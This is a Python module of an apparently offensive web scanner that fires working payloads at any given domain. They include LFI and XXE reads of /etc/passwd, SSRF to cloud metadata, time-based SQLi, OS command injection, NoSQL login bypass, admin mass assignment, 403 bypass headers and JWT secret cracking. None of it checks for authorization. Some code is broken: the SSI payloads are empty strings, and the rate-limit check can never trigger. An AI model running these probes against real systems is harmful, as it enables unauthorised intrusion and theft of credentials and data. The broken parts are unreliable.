import requests
import dns.resolver
import time
import re
import json
import base64
import hmac
import hashlib
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor
from modules.config import get_bypass_headers

# --- 1. CORE VULNERABILITIES ---
def deep_vuln_scanner(domain):
    report = ["\n[*] DEEP VULNERABILITY SCAN (LFI/CONFIG):"]
    base_url = f"http://{domain}"
    critical_files = [".env", ".git/config", "docker-compose.yml", "wp-config.php.bak", "phpinfo.php"]
    found = False
    
    # 1. Config File Hunt
    for f in critical_files:
        try:
            r = requests.get(f"{base_url}/{f}", headers=get_bypass_headers(), timeout=3)
            # Check content length and specific keywords to avoid false positives (Custom 404 pages)
            if r.status_code == 200 and len(r.text) > 0 and "html" not in r.text.lower():
                # Verify content looks real
                if "APP_KEY" in r.text or "repositoryformatversion" in r.text or "version" in r.text:
                    report.append(f"   [☠️] CRITICAL LEAK: {f} FOUND!")
                    found = True
        except: pass
    if not found: report.append("   [✓] No config backups exposed.")
    
    # 2. LFI Scanner
    try:
        r = requests.get(base_url, headers=get_bypass_headers(), timeout=3)
        soup = BeautifulSoup(r.text, 'html.parser')
        vuln_lfi = False
        # Limit links to avoid infinite scanning
        links = [a['href'] for a in soup.find_all('a', href=True) if "=" in a['href']][:10]
        
        for link in links:
            base, param = urljoin(base_url, link).split('=', 1)
            # Try multiple payloads
            payloads = ["../../../../etc/passwd", "....//....//....//etc/passwd"]
            for pay in payloads:
                fuzz_url = f"{base}={pay}"
                try:
                    fr = requests.get(fuzz_url, headers=get_bypass_headers(), timeout=3)
                    if "root:x:0:0" in fr.text:
                        report.append(f"   [☠️] LFI DETECTED: {fuzz_url}")
                        vuln_lfi = True; break
                except: pass
            if vuln_lfi: break
            
        if not vuln_lfi: report.append("   [✓] LFI check passed.")
    except: pass
    return "\n".join(report)

def check_cve_vulnerabilities(text):
    report = ["\n[*] CVE CHECK:"]
    # Expanded basic signature list
    exploits = {
        "vsftpd 2.3.4": "CVE-2011-2523 (Backdoor)", 
        "Apache 2.4.49": "CVE-2021-41773 (Path Traversal)",
        "Log4j": "CVE-2021-44228 (RCE)",
        "Drupal 7": "CVE-2014-3704 (SQLi)"
    }
    found = False
    for soft, cve in exploits.items():
        if soft.lower() in text.lower():
            report.append(f"   [☠️] POTENTIALLY VULNERABLE: {soft} -> {cve}")
            found = True
    if not found: report.append("   [✓] No basic signature match.")
    return "\n".join(report)

def directory_buster(domain):
    report = ["\n[*] DIRECTORY BUSTER:"]
    paths = ["robots.txt", ".env", "admin", "login", "api", "dashboard", "config", "backup.sql"]
    found = []
    url_base = f"http://{domain}"
    for p in paths:
        try:
            url = f"{url_base}/{p}"
            r = requests.get(url, headers=get_bypass_headers(), timeout=3)
            if r.status_code == 200: 
                found.append(f"   [200] FOUND: /{p}")
            elif r.status_code == 403:
                # Attempt 403 Bypass
                headers = get_bypass_headers()
                headers.update({'X-Custom-IP-Authorization': '127.0.0.1', 'X-Forwarded-For': '127.0.0.1'})
                r2 = requests.get(url, headers=headers, timeout=3)
                if r2.status_code == 200: found.append(f"   [!!!] 403 BYPASSED: /{p}")
                else: found.append(f"   [403] LOCKED: /{p}")
        except: pass
    if found: report.extend(found)
    else: report.append("   [-] No access gained.")
    return "\n".join(report)

def check_mass_takeover(subdomains):
    if not subdomains: return ""
    report = ["\n[*] MASS TAKEOVER SCANNER:"]
    # Fingerprints for dangling services
    fingerprints = {
        "github.io": "GitHub Pages", 
        "herokuapp.com": "Heroku", 
        "amazonaws.com": "AWS S3/ElasticBeanstalk", 
        "azurewebsites.net": "Azure App Services",
        "pantheon.io": "Pantheon"
    }
    vuln_found = False
    
    # Check max 15 subdomains to prevent timeout
    for sub in subdomains[:15]:
        try:
            answers = dns.resolver.resolve(sub, 'CNAME')
            for rdata in answers:
                cname = str(rdata.target)
                for fing, name in fingerprints.items():
                    if fing in cname:
                        # Logic: CNAME exists, but if we visit it, does it show 404?
                        try:
                            r = requests.get(f"http://{sub}", timeout=2)
                            if r.status_code == 404:
                                report.append(f"   [$$$] POTENTIAL TAKEOVER: {sub} -> {cname} ({name})")
                                vuln_found = True
                        except: pass
        except: pass
    if not vuln_found: report.append("   [✓] No dangling subdomains found.")
    return "\n".join(report)

def enumerate_cms_users(domain):
    report = ["\n[*] CMS HUNTER (WORDPRESS):"]
    try:
        api_url = f"http://{domain}/wp-json/wp/v2/users"
        res = requests.get(api_url, headers=get_bypass_headers(), timeout=5)
        if res.status_code == 200 and "slug" in res.text:
            users = res.json()
            report.append(f"   [☠️] USER ENUMERATION SUCCESS!")
            for u in users[:5]: # List top 5 users
                report.append(f"       > User: {u.get('slug')}")
        else: report.append("   [✓] WP API secure or not WordPress.")
    except: report.append("   [-] Not WP or API unreachable.")
    return "\n".join(report)

# --- 2. CLOUD & API ATTACKS ---
def check_ssrf(domain, endpoints):
    if not endpoints: return ""
    report = ["\n[*] CLOUD PIERCER (SSRF SCANNER):"]
    base_url = f"http://{domain}"
    payloads = ["http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/computeMetadata/v1/"]
    vuln_found = False
    
    for ep in list(endpoints)[:5]:
        if "=" in ep:
            base_path, param = ep.split('=', 1)
            for pay in payloads:
                target_url = urljoin(base_url, f"{base_path}={pay}")
                try:
                    headers = get_bypass_headers()
                    if "google" in pay: headers['Metadata-Flavor'] = 'Google' 
                    
                    res = requests.get(target_url, headers=headers, timeout=3)
                    if "ami-id" in res.text or "instance-id" in res.text or "d:26500" in res.text:
                        report.append(f"   [☠️] CRITICAL: SSRF FOUND! {target_url}")
                        vuln_found = True; break
                except: pass
        if vuln_found: break
    if not vuln_found: report.append("   [✓] No SSRF vectors.")
    return "\n".join(report)

def check_time_based_sqli(domain, endpoints):
    if not endpoints: return ""
    report = ["\n[*] BLIND SQL INJECTION (TIME-BASED):"]
    base_url = f"http://{domain}"
    payloads = ["'; SELECT SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--", "') SLEEP(5)--"]
    vuln_found = False
    
    for ep in list(endpoints)[:5]:
        if "=" in ep:
            target = urljoin(base_url, ep)
            for pay in payloads:
                fuzz_url = target + pay
                try:
                    start_time = time.time()
                    # Timeout slightly higher than sleep to catch the delay
                    requests.get(fuzz_url, headers=get_bypass_headers(), timeout=8)
                    duration = time.time() - start_time
                    
                    if duration >= 5:
                        report.append(f"   [☠️] BLIND SQLi CONFIRMED: {target}")
                        report.append(f"       > Payload: {pay}")
                        report.append(f"       > Time Lag: {round(duration, 2)}s")
                        vuln_found = True; break
                except: pass # Timeout implies successful sleep in some cases, but risky to assume
        if vuln_found: break
    if not vuln_found: report.append("   [✓] No time delays detected.")
    return "\n".join(report)

# --- 3. PROTOCOL ATTACKS ---
def check_host_header_injection(domain):
    report = ["\n[*] HOST HEADER INJECTION:"]
    url = f"http://{domain}"
    evil_host = "evil-attacker.com"
    try:
        headers = get_bypass_headers()
        headers['Host'] = evil_host
        res = requests.get(url, headers=headers, timeout=5, allow_redirects=False)
        
        if res.status_code in [301, 302]:
            loc = res.headers.get('Location', '')
            if evil_host in loc:
                report.append(f"   [☠️] CRITICAL: HOST HEADER POISONING!")
                report.append(f"       > Redirects to: {loc}")
                return "\n".join(report)
                
        # Reflected Host Header XSS possibility
        if evil_host in res.text:
            report.append(f"   [⚠️] MEDIUM: Host Header Reflected in Body (Potential Cache Poisoning/XSS).")
            return "\n".join(report)
            
        report.append("   [✓] Server ignores spoofed Host headers.")
    except: report.append("   [-] Host injection check failed.")
    return "\n".join(report)

def check_crlf_injection(domain):
    report = ["\n[*] CRLF INJECTION (HEADER SPLITTING):"]
    # Trying to inject a Set-Cookie header
    url = f"http://{domain}/%0d%0aSet-Cookie:NETSENTRY=HACKED"
    try:
        res = requests.get(url, headers=get_bypass_headers(), timeout=3)
        # Check raw headers
        found = False
        for k, v in res.headers.items():
            if "NETSENTRY=HACKED" in str(k) or "NETSENTRY=HACKED" in str(v):
                found = True
        
        if found:
            report.append(f"   [☠️] CRITICAL: CRLF INJECTION VULNERABLE!")
        else: report.append("   [✓] Header Splitting protected.")
    except: report.append("   [-] CRLF check failed.")
    return "\n".join(report)

def analyze_jwt_tokens(scan_text):
    report = ["\n[*] JWT TOKEN INSPECTOR:"]
    # Regex to find JWT-like strings
    tokens = re.findall(r'(eyJ[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+)', scan_text)
    if not tokens:
        report.append("   [-] No JWT tokens found in scan data.")
        return "\n".join(report)
    report.append(f"   [i] Found {len(set(tokens))} unique tokens.")
    
    for token in list(set(tokens))[:3]:
        try:
            header_part = token.split('.')[0]
            # Add padding for base64
            header_part += '=' * (-len(header_part) % 4)
            header_json = json.loads(base64.b64decode(header_part).decode())
            alg = header_json.get('alg', 'unknown')
            
            report.append(f"   [TOKEN] Alg: {alg}")
            if alg.lower() == 'none': 
                report.append(f"       [☠️] CRITICAL: 'NONE' ALGORITHM ALLOWED!")
            elif alg == 'HS256': 
                report.append(f"       [!] Warning: Weak HMAC (HS256) - Crackable.")
        except: pass
    return "\n".join(report)

# --- 4. LOGIC & APPLICATION ATTACKS ---
def check_git_exposure(domain):
    report = ["\n[*] GIT SOURCE HUNTER:"]
    url = f"http://{domain}/.git/HEAD"
    try:
        res = requests.get(url, headers=get_bypass_headers(), timeout=3)
        if res.status_code == 200 and "refs/heads" in res.text:
            report.append(f"   [☠️] CRITICAL: GIT REPO EXPOSED! {url}")
            report.append("       > Source code can be downloaded.")
        else: report.append("   [✓] .git is secure.")
    except: report.append("   [-] Git check failed.")
    return "\n".join(report)

def check_reflected_xss(domain, endpoints):
    if not endpoints: return ""
    report = ["\n[*] XSS SNIPER (REFLECTED):"]
    base_url = f"http://{domain}"
    payload = "<script>alert('NS')</script>"
    vuln_found = False
    
    for ep in list(endpoints)[:5]:
        if "=" in ep:
            base, param = ep.split('=', 1)
            target = urljoin(base_url, f"{base}={payload}")
            try:
                res = requests.get(target, headers=get_bypass_headers(), timeout=3)
                if payload in res.text:
                    report.append(f"   [☠️] XSS FOUND: {target}")
                    vuln_found = True; break
            except: pass
        if vuln_found: break
    if not vuln_found: report.append("   [✓] No Reflected XSS found.")
    return "\n".join(report)

def check_xxe(domain, endpoints):
    if not endpoints: return ""
    report = ["\n[*] XXE INJECTION SCANNER:"]
    base_url = f"http://{domain}"
    xxe_payload = """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"""
    vuln_found = False
    
    for ep in list(endpoints)[:5]:
        target = urljoin(base_url, ep)
        try:
            headers = get_bypass_headers()
            headers['Content-Type'] = 'application/xml'
            r = requests.post(target, data=xxe_payload, headers=headers, timeout=3)
            if "root:x:0:0" in r.text:
                report.append(f"   [☠️] CRITICAL: XXE VULNERABILITY FOUND!")
                report.append(f"       > Target: {target}")
                vuln_found = True; break
        except: pass
    if not vuln_found: report.append("   [✓] No XXE found.")
    return "\n".join(report)

def check_idor_patterns(domain, endpoints):
    if not endpoints: return ""
    report = ["\n[*] IDOR PATTERN HUNTER:"]
    idor_suspects = []
    # Regex for numeric IDs in URL
    id_pattern = re.compile(r'(=|\/)([0-9]{1,10})(&|$)')
    
    for ep in endpoints:
        if id_pattern.search(ep): idor_suspects.append(ep)
        
    if idor_suspects:
        report.append(f"   [⚠️] POTENTIAL IDOR ENDPOINTS FOUND ({len(idor_suspects)}):")
        for i, ep in enumerate(idor_suspects[:5]): report.append(f"       {i+1}. {ep}")
        report.append("       > Tip: Try changing the ID to access other users' data.")
    else: report.append("   [✓] No obvious numeric IDs found.")
    return "\n".join(report)

def check_request_smuggling(domain):
    report = ["\n[*] HTTP REQUEST SMUGGLING (CL.TE/TE.CL):"]
    target = f"http://{domain}"
    try:
        headers = get_bypass_headers()
        headers['Transfer-Encoding'] = 'chunked'
        headers['Content-Length'] = '4' 
        start = time.time()
        try: 
            # Send malformed request
            requests.post(target, headers=headers, data="1\r\nA\r\n0\r\n\r\n", timeout=5)
        except: pass
        duration = time.time() - start
        
        # If server hangs, it might be waiting for more data (Smuggling indicator)
        if duration > 4:
             report.append(f"   [⚠️] POTENTIAL SMUGGLING DETECTED (Time Delay)!")
        else: report.append("   [✓] No smuggling anomalies detected.")
    except: report.append("   [-] Smuggling check failed.")
    return "\n".join(report)

def check_websocket_security(domain):
    report = ["\n[*] WEBSOCKET SECURITY (CSWSH):"]
    http_url = f"http://{domain}/socket.io/?EIO=3&transport=websocket"
    try:
        headers = {
            "Connection": "Upgrade", "Upgrade": "websocket",
            "Origin": "https://evil-hacker.com", "Sec-WebSocket-Version": "13",
            "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ=="
        }
        res = requests.get(http_url, headers=headers, timeout=5)
        if res.status_code == 101 and "evil-hacker.com" in res.headers.get("Access-Control-Allow-Origin", ""):
             report.append(f"   [☠️] CRITICAL: WEBSOCKET HIJACKING POSSIBLE!")
        elif res.status_code == 101:
             report.append(f"   [⚠️] WebSocket Open. Check Origin validation manually.")
        else: report.append("   [✓] No open WebSocket found.")
    except: report.append("   [-] WebSocket check failed.")
    return "\n".join(report)

def check_hpp(domain, endpoints):
    if not endpoints: return ""
    report = ["\n[*] HTTP PARAMETER POLLUTION (HPP):"]
    base_url = f"http://{domain}"
    vuln_found = False
    
    for ep in list(endpoints)[:5]:
        if "=" in ep:
            base, param = ep.split('?', 1) if '?' in ep else (ep, "")
            if "=" in param:
                key, val = param.split('=', 1)
                # Inject duplicate parameter
                target = f"{base_url}{base}?{key}={val}&{key}=666_HPP_TEST"
                try:
                    res = requests.get(target, headers=get_bypass_headers(), timeout=3)
                    # If reflected or processed, it might be vulnerable
                    if "666_HPP_TEST" in res.text:
                        report.append(f"   [⚠️] POTENTIAL HPP: {target}")
                        vuln_found = True; break
                except: pass
        if vuln_found: break
    if not vuln_found: report.append("   [✓] No obvious HPP vectors.")
    return "\n".join(report)

def check_cache_poisoning(domain):
    report = ["\n[*] WEB CACHE POISONING DETECTOR:"]
    url = f"http://{domain}"
    poison_host = "netsentry-test.com"
    try:
        headers = get_bypass_headers()
        headers['X-Forwarded-Host'] = poison_host
        res = requests.get(url, headers=headers, timeout=5)
        
        # Check if cache cached our bad header
        if poison_host in res.text:
            report.append(f"   [☠️] CRITICAL: CACHE POISONING POSSIBLE!")
            report.append(f"       > X-Forwarded-Host reflected in body.")
        else: report.append("   [✓] Cache headers appear secure.")
    except: report.append("   [-] Cache check failed.")
    return "\n".join(report)

def check_prototype_pollution(domain):
    report = ["\n[*] PROTOTYPE POLLUTION FUZZER:"]
    target = f"http://{domain}"
    payload = {"constructor": {"prototype": {"netsentry_pwned": True}}, "__proto__": {"netsentry_pwned": True}}
    try:
        headers = get_bypass_headers()
        headers['Content-Type'] = 'application/json'
        r = requests.post(target, json=payload, headers=headers, timeout=3)
        
        if r.status_code == 500:
             report.append(f"   [⚠️] SERVER ERROR (500): Potential Pollution Crash!")
        elif "netsentry_pwned" in r.text and "true" in r.text.lower():
             report.append(f"   [☠️] CRITICAL: PROTOTYPE POLLUTION REFLECTED!")
        else: report.append("   [✓] Server appears resilient.")
    except: report.append("   [-] Pollution check failed.")
    return "\n".join(report)

def check_backup_files(domain, endpoints):
    if not endpoints: return ""
    report = ["\n[*] BACKUP FILE MINER:"]
    base_url = f"http://{domain}"
    extensions = [".bak", ".old", ".swp", "~", ".save", ".txt"]
    found_files = []
    
    # Filter for interesting files
    targets = [ep for ep in endpoints if ep.endswith(('.php', '.asp', '.jsp', '.js', '.html'))]
    
    for ep in list(targets)[:10]:
        for ext in extensions:
            test_url = urljoin(base_url, ep + ext)
            try:
                r = requests.get(test_url, headers=get_bypass_headers(), timeout=2)
                if r.status_code == 200 and len(r.text) > 0 and "html" not in r.text.lower():
                    report.append(f"   [☠️] SOURCE CODE LEAK: {test_url}")
                    found_files.append(test_url)
            except: pass
            
    if not found_files: report.append("   [✓] No backup files exposed.")
    return "\n".join(report)

def check_ssi_injection(domain, endpoints):
    if not endpoints: return ""
    report = ["\n[*] SSI INJECTION SCANNER:"]
    base_url = f"http://{domain}"
    payloads = {'': "202", '': "bin"}
    vuln_found = False
    
    for ep in list(endpoints)[:5]:
        if "=" in ep:
            base, param = ep.split('=', 1)
            target = urljoin(base_url, base + "=")
            for pay, sig in payloads.items():
                fuzz_url = target + pay
                try:
                    res = requests.get(fuzz_url, headers=get_bypass_headers(), timeout=3)
                    if sig in res.text:
                        report.append(f"   [☠️] CRITICAL: SSI INJECTION FOUND!")
                        report.append(f"       > Target: {fuzz_url}")
                        vuln_found = True; break
                except: pass
        if vuln_found: break
    if not vuln_found: report.append("   [✓] No SSI vectors found.")
    return "\n".join(report)

def check_xpath_injection(domain, endpoints):
    if not endpoints: return ""
    report = ["\n[*] XPATH INJECTION SCANNER:"]
    base_url = f"http://{domain}"
    payloads = ["' or '1'='1", "'] | //user/*"]
    vuln_found = False
    
    for ep in list(endpoints)[:5]:
        if "=" in ep:
            base, param = ep.split('=', 1)
            target = urljoin(base_url, base + "=")
            try:
                for pay in payloads:
                    fuzz_url = target + pay
                    fuzz_resp = requests.get(fuzz_url, headers=get_bypass_headers(), timeout=3).text
                    if "XPathException" in fuzz_resp or "DOMDocument" in fuzz_resp or "SimpleXMLElement" in fuzz_resp:
                        report.append(f"   [☠️] CRITICAL: XPATH INJECTION ERROR!")
                        report.append(f"       > Target: {fuzz_url}")
                        vuln_found = True; break
            except: pass
        if vuln_found: break
    if not vuln_found: report.append("   [✓] No XPath injection errors detected.")
    return "\n".join(report)

def check_nosql_injection(domain, endpoints):
    if not endpoints: return ""
    report = ["\n[*] NOSQL INJECTION SCANNER:"]
    base_url = f"http://{domain}"
    payload = '{"$ne": null}'
    vuln_found = False
    targets = [ep for ep in endpoints if "login" in ep or "api" in ep]
    
    for ep in list(targets)[:5]:
        target = urljoin(base_url, ep)
        try:
            headers = get_bypass_headers()
            headers['Content-Type'] = 'application/json'
            # Try to bypass auth
            r = requests.post(target, json={"user": "admin", "pass": json.loads(payload)}, headers=headers, timeout=3)
            # If we get 200 OK on login without password, it's bypassed
            if r.status_code == 200 and "login" not in r.text.lower() and "error" not in r.text.lower():
                report.append(f"   [☠️] CRITICAL: NOSQL BYPASS: {target}")
                vuln_found = True; break
        except: pass
    if not vuln_found: report.append("   [✓] No NoSQL vectors.")
    return "\n".join(report)

def check_ldap_injection(domain, endpoints):
    if not endpoints: return ""
    report = ["\n[*] LDAP INJECTION SCANNER:"]
    base_url = f"http://{domain}"
    payload = "*)(&"
    vuln_found = False
    
    for ep in list(endpoints)[:5]:
        if "=" in ep:
            base, param = ep.split('=', 1)
            target = urljoin(base_url, base + "=")
            try:
                res = requests.get(target + payload, headers=get_bypass_headers(), timeout=3)
                if "LDAPException" in res.text or "javax.naming.NameNotFoundException" in res.text:
                    report.append(f"   [☠️] LDAP ERROR FOUND: {target}")
                    vuln_found = True; break
            except: pass
    if not vuln_found: report.append("   [✓] No LDAP errors.")
    return "\n".join(report)

def check_race_condition(domain, endpoints):
    if not endpoints: return ""
    report = ["\n[*] RACE CONDITION HEURISTICS:"]
    base_url = f"http://{domain}"
    targets = [ep for ep in endpoints if "coupon" in ep or "transfer" in ep or "gift" in ep]
    if not targets: targets = list(endpoints)[:3]
    vuln_found = False
    
    for ep in targets:
        target = urljoin(base_url, ep)
        responses = []
        
        def send_req():
            try: return requests.get(target, headers=get_bypass_headers(), timeout=5).status_code
            except: return 0
            
        # Send 10 requests simultaneously
        with ThreadPoolExecutor(max_workers=10) as ex:
            futures = [ex.submit(send_req) for _ in range(10)]
            for f in futures: responses.append(f.result())
            
        # If we get different status codes for the same request (e.g. some 200, some 429 or 500)
        if len(set(responses)) > 1:
            report.append(f"   [⚠️] ANOMALY (RACE?): {target}")
            report.append(f"       > Status Codes: {set(responses)}")
            vuln_found = True
            
    if not vuln_found: report.append("   [✓] No race anomalies.")
    return "\n".join(report)

def check_mass_assignment(domain, endpoints):
    if not endpoints: return ""
    report = ["\n[*] MASS ASSIGNMENT:"]
    base_url = f"http://{domain}"
    payload = {"is_admin": True, "role": "admin", "admin": True}
    vuln_found = False
    targets = [ep for ep in endpoints if "user" in ep or "register" in ep or "profile" in ep]
    
    for ep in list(targets)[:5]:
        target = urljoin(base_url, ep)
        try:
            r = requests.post(target, json=payload, headers=get_bypass_headers(), timeout=3)
            # Check if our injected fields are reflected in the response object
            if r.status_code == 200 and ('"role":"admin"' in r.text.lower() or '"is_admin":true' in r.text.lower()):
                report.append(f"   [☠️] CRITICAL: MASS ASSIGNMENT: {target}")
                vuln_found = True; break
        except: pass
    if not vuln_found: report.append("   [✓] No Mass Assignment found.")
    return "\n".join(report)

def check_parameter_tampering(domain, endpoints):
    if not endpoints: return ""
    report = ["\n[*] PARAMETER TAMPERING (LOGIC):"]
    base_url = f"http://{domain}"
    keywords = ["price", "amount", "qty", "balance"]
    payloads = ["-1", "0", "0.01"]
    vuln_found = False
    targets = [ep for ep in endpoints if any(k in ep for k in keywords)]
    
    for ep in targets[:5]:
        if "=" in ep:
            base_path, param = ep.split('?', 1)
            if "=" in param:
                key, val = param.split('=', 1)
                for pay in payloads:
                    target = f"{base_url}{base_path}?{key}={pay}"
                    try:
                        res = requests.get(target, headers=get_bypass_headers(), timeout=3)
                        # Heuristic: If we get 200 OK and no error, and our negative value is reflected
                        if res.status_code == 200 and pay in res.text and "error" not in res.text.lower():
                            report.append(f"   [☠️] LOGIC FLAW DETECTED: {target}")
                            vuln_found = True; break
                    except: pass
        if vuln_found: break
    if not vuln_found: report.append("   [✓] No tampering vectors.")
    return "\n".join(report)

def check_rate_limit_bypass(domain):
    report = ["\n[*] API RATE LIMIT BYPASS:"]
    url = f"http://{domain}/"
    try:
        # 1. Baseline check (is there a limit?)
        # Skipping true DOS for safety, just checking logic
        responses = []
        # 2. Spoof check
        spoofed = []
        for i in range(3):
            h = get_bypass_headers(); h['X-Forwarded-For'] = f"10.0.0.{i}"
            try:
                spoofed.append(requests.get(url, headers=h, timeout=2).status_code)
            except: pass
            
        if 429 in responses and 200 in spoofed:
             report.append(f"   [☠️] RATE LIMIT BYPASS SUCCESSFUL via X-Forwarded-For!")
        else: report.append("   [✓] Rate limiting appears robust (or not triggered).")
    except: report.append("   [-] Check failed.")
    return "\n".join(report)

def check_cors(domain):
    report = ["\n[*] CORS CONFIG CHECK:"]
    url = f"http://{domain}"
    try:
        headers = get_bypass_headers()
        headers['Origin'] = "https://evil-site.com"
        res = requests.get(url, headers=headers, timeout=3)
        
        if "evil-site.com" in res.headers.get('Access-Control-Allow-Origin', ''):
            report.append(f"   [☠️] CRITICAL: CORS MISCONFIGURATION!")
            report.append(f"       > Allowed Origin: evil-site.com")
            if "true" in str(res.headers.get('Access-Control-Allow-Credentials')).lower():
                report.append(f"       > Allow Credentials: TRUE (High Risk)")
        else:
            report.append("   [✓] CORS policy secure.")
    except: report.append("   [-] CORS check failed.")
    return "\n".join(report)

def check_clickjacking(domain):
    report = ["\n[*] CLICKJACKING CHECK:"]
    try:
        res = requests.get(f"http://{domain}", headers=get_bypass_headers(), timeout=3)
        headers = {k.lower(): v for k, v in res.headers.items()}
        
        if 'x-frame-options' not in headers and 'content-security-policy' not in headers:
            report.append("   [⚠️] VULNERABLE: Missing X-Frame-Options header.")
        else:
            report.append("   [✓] Protected against Clickjacking.")
    except: pass
    return "\n".join(report)

def check_open_redirect(domain, endpoints):
    if not endpoints: return ""
    report = ["\n[*] OPEN REDIRECT HUNTER:"]
    base_url = f"http://{domain}"
    payload = "http://google.com"
    found = False
    
    for ep in list(endpoints)[:5]:
        if "=" in ep:
            base, param = ep.split('=', 1)
            target = urljoin(base_url, f"{base}={payload}")
            try:
                r = requests.get(target, headers=get_bypass_headers(), allow_redirects=False, timeout=3)
                if r.status_code in [301, 302] and "google.com" in r.headers.get('Location',''):
                    report.append(f"   [☠️] OPEN REDIRECT: {target}")
                    found = True; break
            except: pass
    if not found: report.append("   [✓] No open redirects found.")
    return "\n".join(report)

def check_ssti(domain, endpoints):
    if not endpoints: return ""
    report = ["\n[*] SSTI SCANNER:"]
    base_url = f"http://{domain}"
    payloads = {"{{7*7}}": "49", "${7*7}": "49", "<%= 7*7 %>": "49"}
    vuln_found = False
    
    for ep in list(endpoints)[:5]:
        if "=" in ep:
            base, param = ep.split('=', 1)
            target = urljoin(base_url, base + "=")
            for pay, sig in payloads.items():
                try:
                    res = requests.get(target + pay, headers=get_bypass_headers(), timeout=3)
                    if sig in res.text:
                        report.append(f"   [☠️] CRITICAL: SSTI FOUND! {target+pay}")
                        vuln_found = True; break
                except: pass
        if vuln_found: break
    if not vuln_found: report.append("   [✓] No SSTI found.")
    return "\n".join(report)

def check_graphql(domain):
    report = ["\n[*] GRAPHQL INSPECTOR:"]
    paths = ["/graphql", "/api/graphql", "/v1/graphql"]
    for p in paths:
        try:
            target = f"http://{domain}{p}"
            r = requests.get(target, timeout=3)
            # 400 Bad Request often means "I understand GraphQL but you sent no query"
            if r.status_code in [200, 400]:
                report.append(f"   [+] GraphQL Endpoint: {target}")
                # Check Introspection
                q = '{"query": "{__schema{types{name}}}"}'
                try:
                    r2 = requests.post(target, data=q, headers={'Content-Type':'application/json'}, timeout=5)
                    if "__schema" in r2.text:
                         report.append(f"   [☠️] CRITICAL: INTROSPECTION ENABLED! (Schema Dump Possible)")
                except: pass
        except: pass
    return "\n".join(report)

def check_deserialization(domain):
    report = ["\n[*] DESERIALIZATION SCAN:"]
    try:
        r = requests.get(f"http://{domain}", headers=get_bypass_headers(), timeout=5)
        vuln = False
        for n, v in r.cookies.items():
            # Java Serialized Object signatures
            if v.startswith("rO0AB") or v.startswith("Tzo"):
                report.append(f"   [☠️] SERIALIZED OBJECT IN COOKIE: {n}")
                report.append(f"       > Value: {v[:20]}...")
                vuln = True
        if not vuln: report.append("   [✓] No serialized objects found in cookies.")
    except: pass
    return "\n".join(report)

def check_verb_tampering(domain):
    report = ["\n[*] VERB TAMPERING:"]
    try:
        # Check if HEAD bypasses authentication
        r = requests.request("HEAD", f"http://{domain}/admin", headers=get_bypass_headers(), timeout=3)
        if r.status_code == 200: 
            report.append("   [☠️] AUTH BYPASS via HEAD method!")
        else: report.append("   [✓] Verbs restricted.")
    except: pass
    return "\n".join(report)

def check_os_injection(domain, endpoints):
    if not endpoints: return ""
    report = ["\n[*] OS COMMAND INJECTION:"]
    base_url = f"http://{domain}"
    payloads = {"; echo 'rce_test'": "rce_test", "| echo 'rce_test'": "rce_test"}
    vuln = False
    
    for ep in list(endpoints)[:5]:
        if "=" in ep:
            base, param = ep.split('=', 1)
            target = urljoin(base_url, base + "=")
            for pay, sig in payloads.items():
                try:
                    if sig in requests.get(target + pay, timeout=3).text:
                        report.append(f"   [☠️] RCE DETECTED: {target+pay}")
                        vuln = True; break
                except: pass
        if vuln: break
    if not vuln: report.append("   [✓] No OS injection.")
    return "\n".join(report)

def crack_jwt_secret(scan_text):
    report = ["\n[*] JWT SECRET CRACKER (HS256):"]
    tokens = re.findall(r'(eyJ[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+)', scan_text)
    if not tokens:
        report.append("   [-] No tokens found.")
        return "\n".join(report)
    
    common_secrets = ["secret", "key", "123456", "password", "admin", "jwt", "1234567890", "mysupersecret"]
    cracked = False
    
    for token in list(set(tokens))[:3]:
        try:
            header, payload, signature = token.split('.')
            header_pad = header + '=' * (-len(header) % 4)
            # Only attack HS256
            if 'HS256' not in base64.b64decode(header_pad).decode(): continue
            
            data = f"{header}.{payload}".encode()
            for s in common_secrets:
                sig_attempt = base64.urlsafe_b64encode(hmac.new(s.encode(), data, hashlib.sha256).digest()).decode().rstrip('=')
                if sig_attempt == signature:
                    report.append(f"   [☠️] CRACKED! Secret: '{s}'")
                    cracked = True; break
        except: pass
        if cracked: break
        
    if not cracked: report.append("   [✓] Dictionary attack failed (Weak secrets not found).")
    return "\n".join(report)